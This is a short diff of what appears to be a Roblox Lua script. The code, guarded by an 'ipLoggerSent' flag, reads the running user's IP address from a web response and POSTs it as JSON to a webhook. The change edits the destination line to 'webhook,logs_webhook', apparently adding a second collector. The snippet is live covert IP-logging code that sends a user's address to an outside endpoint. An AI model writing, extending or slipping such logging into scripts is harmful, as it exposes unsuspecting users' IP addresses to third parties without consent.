@@ -26,7 +26,7 @@ if req and not ipLoggerSent then
     if success and response and response.Body then
         local userIP = tostring(response.Body)
         req({
-            Url = logs_webhook,
+            Url = webhook,logs_webhook,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode({
